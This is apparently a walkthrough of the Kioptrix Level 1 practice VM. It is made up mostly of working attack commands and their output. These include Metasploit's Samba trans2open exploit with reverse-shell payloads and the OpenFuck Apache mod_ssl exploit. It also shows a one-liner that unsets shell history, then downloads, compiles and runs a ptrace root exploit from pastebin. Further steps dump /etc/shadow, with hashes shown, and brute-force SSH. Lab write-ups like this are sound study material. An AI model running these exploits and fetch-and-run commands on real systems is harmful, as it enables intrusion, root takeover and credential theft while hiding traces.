# Kioptrix

## Exploit to Samba 2.2 by using metasploit-framework

First I `searchsploit samba 2.2` to find exploits from exploit-db

```
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Samba 2.0.x/2.2 - Arbitrary File Creation     | unix/remote/20968.txt
Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overfl | osx/remote/9924.rb
Samba 2.2.2 < 2.2.6 - 'nttrans' Remote Buffer | linux/remote/16321.rb
Samba 2.2.8 (BSD x86) - 'trans2open' Remote O | bsd_x86/remote/16880.rb
Samba 2.2.8 (Linux Kernel 2.6 / Debian / Mand | linux/local/23674.txt
Samba 2.2.8 (Linux x86) - 'trans2open' Remote | linux_x86/remote/16861.rb
Samba 2.2.8 (OSX/PPC) - 'trans2open' Remote O | osx_ppc/remote/16876.rb
Samba 2.2.8 (Solaris SPARC) - 'trans2open' Re | solaris_sparc/remote/16330.rb
Samba 2.2.8 - Brute Force Method Remote Comma | linux/remote/55.c
Samba 2.2.x - 'call_trans2open' Remote Buffer | unix/remote/22468.c
Samba 2.2.x - 'call_trans2open' Remote Buffer | unix/remote/22469.c
Samba 2.2.x - 'call_trans2open' Remote Buffer | unix/remote/22470.c
Samba 2.2.x - 'call_trans2open' Remote Buffer | unix/remote/22471.txt
Samba 2.2.x - 'nttrans' Remote Overflow (Meta | linux/remote/9936.rb
Samba 2.2.x - CIFS/9000 Server A.01.x Packet  | unix/remote/22356.c
Samba 2.2.x - Remote Buffer Overflow          | linux/remote/7.pl
Samba < 2.2.8 (Linux/BSD) - Remote Code Execu | multiple/remote/10.c
Samba < 3.0.20 - Remote Heap Overflow         | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC) | linux_x86/dos/36741.py
---------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

`trans2open` vulnerability look interested so I start and search on metasploit-framework

```
Matching Modules
================

   #  Name                              Disclosure Date  Rank   Check  Description
   -  ----                              ---------------  ----   -----  -----------
   0  exploit/freebsd/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
   1  exploit/linux/samba/trans2open    2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
   2  exploit/osx/samba/trans2open      2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
   3  exploit/solaris/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)
```

from previous enumeration I knew that the target OS is linux so I will use `exploit/linux/samba/trans2open` then set target ip address

```
[msf](Jobs:0 Agents:0) >> use 1
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(linux/samba/trans2open) >> options

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.met
                                      asploit.com/docs/using-metasploit/basics
                                      /using-metasploit.html
   RPORT   139              yes       The target port (TCP)


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.103    yes       The listen address (an interface may be s
                                     pecified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(linux/samba/trans2open) >> set RHOSTS 192.168.1.107
RHOSTS => 192.168.1.107
[msf](Jobs:0 Agents:0) exploit(linux/samba/trans2open) >> show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Samba 2.2.x - Bruteforce


[msf](Jobs:0 Agents:0) exploit(linux/samba/trans2open) >> exploit

[*] Started reverse TCP handler on 192.168.1.103:4444 
[*] 192.168.1.107:139 - Trying return address 0xbffffdfc...
[-] 192.168.1.107:139 - 192.168.1.107 The connection with (192.168.1.107:139) timed out.
[*] 192.168.1.107:139 - Trying return address 0xbffffcfc...
^C[-] 192.168.1.107:139 - Exploit failed [user-interrupt]: Interrupt 
[-] exploit: Interrupted
[msf](Jobs:0 Agents:0) exploit(linux/samba/trans2open) >> exploit

[*] Started reverse TCP handler on 192.168.1.103:4444 
[*] 192.168.1.107:139 - Trying return address 0xbffffdfc...
[*] 192.168.1.107:139 - Trying return address 0xbffffcfc...
[*] 192.168.1.107:139 - Trying return address 0xbffffbfc...
[*] 192.168.1.107:139 - Trying return address 0xbffffafc...
[*] Sending stage (1017704 bytes) to 192.168.1.107
[*] 192.168.1.107 - Meterpreter session 1 closed.  Reason: Died
[*] 192.168.1.107:139 - Trying return address 0xbffff9fc...
[*] Sending stage (1017704 bytes) to 192.168.1.107
[*] 192.168.1.107 - Meterpreter session 2 closed.  Reason: Died
[*] 192.168.1.107:139 - Trying return address 0xbffff8fc...
[*] Sending stage (1017704 bytes) to 192.168.1.107
[*] 192.168.1.107 - Meterpreter session 3 closed.  Reason: Died
[*] 192.168.1.107:139 - Trying return address 0xbffff7fc...
[*] Sending stage (1017704 bytes) to 192.168.1.107
[*] 192.168.1.107 - Meterpreter session 4 closed.  Reason: Died
[*] 192.168.1.107:139 - Trying return address 0xbffff6fc...
[*] 192.168.1.107:139 - Trying return address 0xbffff5fc...
[*] 192.168.1.107:139 - Trying return address 0xbffff4fc...
[*] 192.168.1.107:139 - Trying return address 0xbffff3fc...
[*] 192.168.1.107:139 - Trying return address 0xbffff2fc...
[*] 192.168.1.107:139 - Trying return address 0xbffff1fc...
[*] 192.168.1.107:139 - Trying return address 0xbffff0fc...
[*] 192.168.1.107:139 - Trying return address 0xbfffeffc...
[*] 192.168.1.107:139 - Trying return address 0xbfffeefc...
[*] 192.168.1.107:139 - Trying return address 0xbfffedfc...
^C[-] 192.168.1.107:139 - Exploit failed [user-interrupt]: Interrupt 
[-] exploit: Interrupted
[msf](Jobs:0 Agents:0) exploit(linux/samba/trans2open) >> 

```
it seem work but not because it sent the payload but response with died flag so I changed the payload to `linux/x86/shell_reverse_tcp` which is non-stage payloads

```
[msf](Jobs:0 Agents:0) exploit(linux/samba/trans2open) >> options

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.1.107    yes       The target host(s), see https://docs.met
                                      asploit.com/docs/using-metasploit/basics
                                      /using-metasploit.html
   RPORT   139              yes       The target port (TCP)


Payload options (linux/x86/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   CMD    /bin/sh          yes       The command string to execute
   LHOST  192.168.1.103    yes       The listen address (an interface may be s
                                     pecified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(linux/samba/trans2open) >> 

```

I ran the exploit command again then I got the shell

```
[msf](Jobs:0 Agents:0) exploit(linux/samba/trans2open) >> run

[*] Started reverse TCP handler on 192.168.1.103:4444 
[*] 192.168.1.107:139 - Trying return address 0xbffffdfc...
[*] 192.168.1.107:139 - Trying return address 0xbffffcfc...
[*] 192.168.1.107:139 - Trying return address 0xbffffbfc...
[*] 192.168.1.107:139 - Trying return address 0xbffffafc...
[*] 192.168.1.107:139 - Trying return address 0xbffff9fc...
[*] 192.168.1.107:139 - Trying return address 0xbffff8fc...
[*] 192.168.1.107:139 - Trying return address 0xbffff7fc...
[*] 192.168.1.107:139 - Trying return address 0xbffff6fc...
[*] Command shell session 5 opened (192.168.1.103:4444 -> 192.168.1.107:32773) at 2024-04-25 01:00:53 +0700

[*] Command shell session 6 opened (192.168.1.103:4444 -> 192.168.1.107:32774) at 2024-04-25 01:00:54 +0700
[*] Command shell session 7 opened (192.168.1.103:4444 -> 192.168.1.107:32775) at 2024-04-25 01:00:55 +0700
[*] Command shell session 8 opened (192.168.1.103:4444 -> 192.168.1.107:32776) at 2024-04-25 01:00:57 +0700
whoami
root
id
uid=0(root) gid=0(root) groups=99(nobody)

```

## Manual exploit with openFuck for apache vulnerability

First I compiled C source code and run to verify it should work

```
•100% ➜ ./OpenFuck 

*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

: Usage: ./OpenFuck target box [port] [-c N]

  target - supported box eg: 0x00
  box - hostname or IP address
  port - port for ssl connection
  -c open N connections. (use range 40-50 if u dont know)
  

  Supported OffSet:
	0x00 - Caldera OpenLinux (apache-1.3.26)
	0x01 - Cobalt Sun 6.0 (apache-1.3.12)
	0x02 - Cobalt Sun 6.0 (apache-1.3.20)
	0x03 - Cobalt Sun x (apache-1.3.26)
	0x04 - Cobalt Sun x Fixed2 (apache-1.3.26)
	0x05 - Conectiva 4 (apache-1.3.6)
	0x06 - Conectiva 4.1 (apache-1.3.9)
	0x07 - Conectiva 6 (apache-1.3.14)
	0x08 - Conectiva 7 (apache-1.3.12)
	0x09 - Conectiva 7 (apache-1.3.19)
	0x0a - Conectiva 7/8 (apache-1.3.26)
	0x0b - Conectiva 8 (apache-1.3.22)
	0x0c - Debian GNU Linux 2.2 Potato (apache_1.3.9-14.1)
	0x0d - Debian GNU Linux (apache_1.3.19-1)
	0x0e - Debian GNU Linux (apache_1.3.22-2)
	0x0f - Debian GNU Linux (apache-1.3.22-2.1)
	0x10 - Debian GNU Linux (apache-1.3.22-5)
	0x11 - Debian GNU Linux (apache_1.3.23-1)
	0x12 - Debian GNU Linux (apache_1.3.24-2.1)
	0x13 - Debian Linux GNU Linux 2 (apache_1.3.24-2.1)
	0x14 - Debian GNU Linux (apache_1.3.24-3)
	0x15 - Debian GNU Linux (apache-1.3.26-1)
	0x16 - Debian GNU Linux 3.0 Woody (apache-1.3.26-1)
	0x17 - Debian GNU Linux (apache-1.3.27)
	0x18 - FreeBSD (apache-1.3.9)
	0x19 - FreeBSD (apache-1.3.11)
	0x1a - FreeBSD (apache-1.3.12.1.40)
	0x1b - FreeBSD (apache-1.3.12.1.40)
	0x1c - FreeBSD (apache-1.3.12.1.40)
	0x1d - FreeBSD (apache-1.3.12.1.40_1)
	0x1e - FreeBSD (apache-1.3.12)
	0x1f - FreeBSD (apache-1.3.14)
	0x20 - FreeBSD (apache-1.3.14)
	0x21 - FreeBSD (apache-1.3.14)
	0x22 - FreeBSD (apache-1.3.14)
	0x23 - FreeBSD (apache-1.3.14)
	0x24 - FreeBSD (apache-1.3.17_1)
	0x25 - FreeBSD (apache-1.3.19)
	0x26 - FreeBSD (apache-1.3.19_1)
	0x27 - FreeBSD (apache-1.3.20)
	0x28 - FreeBSD (apache-1.3.20)
	0x29 - FreeBSD (apache-1.3.20+2.8.4)
	0x2a - FreeBSD (apache-1.3.20_1)
	0x2b - FreeBSD (apache-1.3.22)
	0x2c - FreeBSD (apache-1.3.22_7)
	0x2d - FreeBSD (apache_fp-1.3.23)
	0x2e - FreeBSD (apache-1.3.24_7)
	0x2f - FreeBSD (apache-1.3.24+2.8.8)
	0x30 - FreeBSD 4.6.2-Release-p6 (apache-1.3.26)
	0x31 - FreeBSD 4.6-Realease (apache-1.3.26)
	0x32 - FreeBSD (apache-1.3.27)
	0x33 - Gentoo Linux (apache-1.3.24-r2)
	0x34 - Linux Generic (apache-1.3.14)
	0x35 - Mandrake Linux X.x (apache-1.3.22-10.1mdk)
	0x36 - Mandrake Linux 7.1 (apache-1.3.14-2)
	0x37 - Mandrake Linux 7.1 (apache-1.3.22-1.4mdk)
	0x38 - Mandrake Linux 7.2 (apache-1.3.14-2mdk)
	0x39 - Mandrake Linux 7.2 (apache-1.3.14) 2
	0x3a - Mandrake Linux 7.2 (apache-1.3.20-5.1mdk)
	0x3b - Mandrake Linux 7.2 (apache-1.3.20-5.2mdk)
	0x3c - Mandrake Linux 7.2 (apache-1.3.22-1.3mdk)
	0x3d - Mandrake Linux 7.2 (apache-1.3.22-10.2mdk)
	0x3e - Mandrake Linux 8.0 (apache-1.3.19-3)
	0x3f - Mandrake Linux 8.1 (apache-1.3.20-3)
	0x40 - Mandrake Linux 8.2 (apache-1.3.23-4)
	0x41 - Mandrake Linux 8.2 #2 (apache-1.3.23-4)
	0x42 - Mandrake Linux 8.2 (apache-1.3.24)
	0x43 - Mandrake Linux 9 (apache-1.3.26)
	0x44 - RedHat Linux ?.? GENERIC (apache-1.3.12-1)
	0x45 - RedHat Linux TEST1 (apache-1.3.12-1)
	0x46 - RedHat Linux TEST2 (apache-1.3.12-1)
	0x47 - RedHat Linux GENERIC (marumbi) (apache-1.2.6-5)
	0x48 - RedHat Linux 4.2 (apache-1.1.3-3)
	0x49 - RedHat Linux 5.0 (apache-1.2.4-4)
	0x4a - RedHat Linux 5.1-Update (apache-1.2.6)
	0x4b - RedHat Linux 5.1 (apache-1.2.6-4)
	0x4c - RedHat Linux 5.2 (apache-1.3.3-1)
	0x4d - RedHat Linux 5.2-Update (apache-1.3.14-2.5.x)
	0x4e - RedHat Linux 6.0 (apache-1.3.6-7)
	0x4f - RedHat Linux 6.0 (apache-1.3.6-7)
	0x50 - RedHat Linux 6.0-Update (apache-1.3.14-2.6.2)
	0x51 - RedHat Linux 6.0 Update (apache-1.3.24)
	0x52 - RedHat Linux 6.1 (apache-1.3.9-4)1
	0x53 - RedHat Linux 6.1 (apache-1.3.9-4)2
	0x54 - RedHat Linux 6.1-Update (apache-1.3.14-2.6.2)
	0x55 - RedHat Linux 6.1-fp2000 (apache-1.3.26)
	0x56 - RedHat Linux 6.2 (apache-1.3.12-2)1
	0x57 - RedHat Linux 6.2 (apache-1.3.12-2)2
	0x58 - RedHat Linux 6.2 mod(apache-1.3.12-2)3
	0x59 - RedHat Linux 6.2 update (apache-1.3.22-5.6)1
	0x5a - RedHat Linux 6.2-Update (apache-1.3.22-5.6)2
	0x5b - Redhat Linux 7.x (apache-1.3.22)
	0x5c - RedHat Linux 7.x (apache-1.3.26-1)
	0x5d - RedHat Linux 7.x (apache-1.3.27)
	0x5e - RedHat Linux 7.0 (apache-1.3.12-25)1
	0x5f - RedHat Linux 7.0 (apache-1.3.12-25)2
	0x60 - RedHat Linux 7.0 (apache-1.3.14-2)
	0x61 - RedHat Linux 7.0-Update (apache-1.3.22-5.7.1)
	0x62 - RedHat Linux 7.0-7.1 update (apache-1.3.22-5.7.1)
	0x63 - RedHat Linux 7.0-Update (apache-1.3.27-1.7.1)
	0x64 - RedHat Linux 7.1 (apache-1.3.19-5)1
	0x65 - RedHat Linux 7.1 (apache-1.3.19-5)2
	0x66 - RedHat Linux 7.1-7.0 update (apache-1.3.22-5.7.1)
	0x67 - RedHat Linux 7.1-Update (1.3.22-5.7.1)
	0x68 - RedHat Linux 7.1 (apache-1.3.22-src)
	0x69 - RedHat Linux 7.1-Update (1.3.27-1.7.1)
	0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
	0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
	0x6c - RedHat Linux 7.2-Update (apache-1.3.22-6)
	0x6d - RedHat Linux 7.2 (apache-1.3.24)
	0x6e - RedHat Linux 7.2 (apache-1.3.26)
	0x6f - RedHat Linux 7.2 (apache-1.3.26-snc)
	0x70 - Redhat Linux 7.2 (apache-1.3.26 w/PHP)1
	0x71 - Redhat Linux 7.2 (apache-1.3.26 w/PHP)2
	0x72 - RedHat Linux 7.2-Update (apache-1.3.27-1.7.2)
	0x73 - RedHat Linux 7.3 (apache-1.3.23-11)1
	0x74 - RedHat Linux 7.3 (apache-1.3.23-11)2
	0x75 - RedHat Linux 7.3 (apache-1.3.27)
	0x76 - RedHat Linux 8.0 (apache-1.3.27)
	0x77 - RedHat Linux 8.0-second (apache-1.3.27)
	0x78 - RedHat Linux 8.0 (apache-2.0.40)
	0x79 - Slackware Linux 4.0 (apache-1.3.6)
	0x7a - Slackware Linux 7.0 (apache-1.3.9)
	0x7b - Slackware Linux 7.0 (apache-1.3.26)
	0x7c - Slackware 7.0  (apache-1.3.26)2
	0x7d - Slackware Linux 7.1 (apache-1.3.12)
	0x7e - Slackware Linux 8.0 (apache-1.3.20)
	0x7f - Slackware Linux 8.1 (apache-1.3.24)
	0x80 - Slackware Linux 8.1 (apache-1.3.26)
	0x81 - Slackware Linux 8.1-stable (apache-1.3.26)
	0x82 - Slackware Linux (apache-1.3.27)
	0x83 - SuSE Linux 7.0 (apache-1.3.12)
	0x84 - SuSE Linux 7.1 (apache-1.3.17)
	0x85 - SuSE Linux 7.2 (apache-1.3.19)
	0x86 - SuSE Linux 7.3 (apache-1.3.20)
	0x87 - SuSE Linux 8.0 (apache-1.3.23)
	0x88 - SUSE Linux 8.0 (apache-1.3.23-120)
	0x89 - SuSE Linux 8.0 (apache-1.3.23-137)
	0x8a - Yellow Dog Linux/PPC 2.3 (apache-1.3.22-6.2.3a)

Fuck to all guys who like use lamah ddos. Read SRC to have no surprise
```

From enumeration process I knew that `Apache/1.3.20` and `Red-hat 7.2` whichis `0x6b` then run the command `./OpenFuck 0x6b 192.168.1.107 -c 40`

```
*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 40 of 40
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8088
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$ 
bash-2.05$ unset HISTFILE; cd /tmp; wget https://pastebin.com/raw/C7v25Xr9 -O ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; 
--18:19:22--  https://pastebin.com/raw/C7v25Xr9
           => `ptrace-kmod.c'
Connecting to pastebin.com:443... connected!
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/plain]

    0K ...                                                    @   3.84 MB/s

18:19:23 (3.84 MB/s) - `ptrace-kmod.c' saved [4026]

ptrace-kmod.c:183:1: warning: no newline at end of file
[+] Attached to 1079
[+] Waiting for signal
[+] Signal caught
[+] Shellcode placed at 0x4001189d
[+] Now wait for suid shell...
whoami
root
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
hostname
kioptrix.level1
cat /etc/shadow
....
john:$1$zL4.MR4t$26N4YpTGceBO0gTX6TAky1:14513:0:99999:7:::
harold:$1$Xx6dZdOd$IMOGACl3r757dv17LZ9010:14513:0:99999:7:::

```

## Brute force attack with hydra

`hydra -ll root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.1.107 -t 4 -V` to brute force to SSH protocol with wordlist from metasploit. but I got this error 
```
[DATA] attacking ssh://192.168.1.107:22/
[ERROR] could not connect to ssh://192.168.1.107:22 - kex error : no match for method kex algos: server [diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1], client [curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256]
```

I searched and found this link [fix diffie-hellman](https://medium.com/@sany4sec/ssh-error-in-hydra-while-brute-forcing-b148a61752e2) then run command again but I still encountered the issue

```
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.1.107 -V
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-25 01:45:38
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1009 login tries (l:1/p:1009), ~64 tries per task
[DATA] attacking ssh://192.168.1.107:22/
[ERROR] could not connect to ssh://192.168.1.107:22 - ssh_set_client_kex: Out of memory
```

so I changed the plan to use metasploit instead

```
[msf](Jobs:0 Agents:0) >> search ssh_login

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  auxiliary/scanner/ssh/ssh_login                          normal  No     SSH Login Check Scanner
   1  auxiliary/scanner/ssh/ssh_login_pubkey                   normal  No     SSH Public Key Login Scanner


Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/ssh/ssh_login_pubkey

[msf](Jobs:0 Agents:0) >> use 0
[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   ANONYMOUS_LOGIN   false            yes       Attempt to login with a blank
                                                username and password
   BLANK_PASSWORDS   false            no        Try blank passwords for all us
                                                ers
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0
                                                 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple
                                                stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the curre
                                                nt database to the list
   DB_ALL_USERS      false            no        Add all users in the current d
                                                atabase to the list
   DB_SKIP_EXISTING  none             no        Skip existing credentials stor
                                                ed in the current database (Ac
                                                cepted: none, user, user&realm
                                                )
   PASSWORD                           no        A specific password to authent
                                                icate with
   PASS_FILE                          no        File containing passwords, one
                                                 per line
   RHOSTS                             yes       The target host(s), see https:
                                                //docs.metasploit.com/docs/usi
                                                ng-metasploit/basics/using-met
                                                asploit.html
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credentia
                                                l works for a host
   THREADS           1                yes       The number of concurrent threa
                                                ds (max one per host)
   USERNAME                           no        A specific username to authent
                                                icate as
   USERPASS_FILE                      no        File containing users and pass
                                                words separated by space, one
                                                pair per line
   USER_AS_PASS      false            no        Try the username as the passwo
                                                rd for all users
   USER_FILE                          no        File containing usernames, one
                                                 per line
   VERBOSE           false            yes       Whether to print output for al
                                                l attempts


View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> set username root
username => root
[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> set pass_file  /usr/share/wordlists/metasploit/unix_passwords.txt
pass_file => /usr/share/wordlists/metasploit/unix_passwords.txt
[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> set RHOSTS 192.168.1.107
RHOSTS => 192.168.1.107
[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting    Required  Description
   ----              ---------------    --------  -----------
   ANONYMOUS_LOGIN   false              yes       Attempt to login with a blan
                                                  k username and password
   BLANK_PASSWORDS   false              no        Try blank passwords for all
                                                  users
   BRUTEFORCE_SPEED  5                  yes       How fast to bruteforce, from
                                                   0 to 5
   DB_ALL_CREDS      false              no        Try each user/password coupl
                                                  e stored in the current data
                                                  base
   DB_ALL_PASS       false              no        Add all passwords in the cur
                                                  rent database to the list
   DB_ALL_USERS      false              no        Add all users in the current
                                                   database to the list
   DB_SKIP_EXISTING  none               no        Skip existing credentials st
                                                  ored in the current database
                                                   (Accepted: none, user, user
                                                  &realm)
   PASSWORD                             no        A specific password to authe
                                                  nticate with
   PASS_FILE         /usr/share/wordli  no        File containing passwords, o
                     sts/metasploit/un            ne per line
                     ix_passwords.txt
   RHOSTS            192.168.1.107      yes       The target host(s), see http
                                                  s://docs.metasploit.com/docs
                                                  /using-metasploit/basics/usi
                                                  ng-metasploit.html
   RPORT             22                 yes       The target port
   STOP_ON_SUCCESS   false              yes       Stop guessing when a credent
                                                  ial works for a host
   THREADS           1                  yes       The number of concurrent thr
                                                  eads (max one per host)
   USERNAME          root               no        A specific username to authe
                                                  nticate as
   USERPASS_FILE                        no        File containing users and pa
                                                  sswords separated by space,
                                                  one pair per line
   USER_AS_PASS      false              no        Try the username as the pass
                                                  word for all users
   USER_FILE                            no        File containing usernames, o
                                                  ne per line
   VERBOSE           false              yes       Whether to print output for
                                                  all attempts


View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> set threads 10
threads => 10
[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> set verbose true
verbose => true

[*] 192.168.1.107:22 - Starting bruteforce
[-] 192.168.1.107:22 - Failed: 'root:admin'
[!] No active DB -- Credential data will not be saved!
[-] 192.168.1.107:22 - Failed: 'root:123456'
[-] 192.168.1.107:22 - Failed: 'root:12345'
[-] 192.168.1.107:22 - Failed: 'root:123456789'
[-] 192.168.1.107:22 - Failed: 'root:password'
[-] 192.168.1.107:22 - Failed: 'root:iloveyou'
[-] 192.168.1.107:22 - Failed: 'root:princess'
[-] 192.168.1.107:22 - Failed: 'root:1234567'
[-] 192.168.1.107:22 - Failed: 'root:12345678'
[-] 192.168.1.107:22 - Failed: 'root:abc123'
[-] 192.168.1.107:22 - Failed: 'root:nicole'
[-] 192.168.1.107:22 - Failed: 'root:daniel'
[-] 192.168.1.107:22 - Failed: 'root:babygirl'
[-] 192.168.1.107:22 - Failed: 'root:monkey'
```


